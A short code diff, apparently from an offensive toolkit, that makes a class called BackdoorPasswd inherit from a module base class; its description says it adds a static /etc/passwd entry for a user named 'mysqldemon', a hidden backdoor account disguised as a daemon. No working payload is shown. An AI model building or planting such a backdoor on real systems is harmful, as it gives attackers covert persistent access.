@@ -1,8 +1,8 @@
 import logging
 import crypt
-from hyderaddons import bcolors
+from hyderaddons import bcolors, ModuleBaseClass
 
-class BackdoorPasswd:
+class BackdoorPasswd(ModuleBaseClass):
 
     name = "backdoor_passwd"
     description = "Adds static /etc/passwd entry for user mysqldemon"
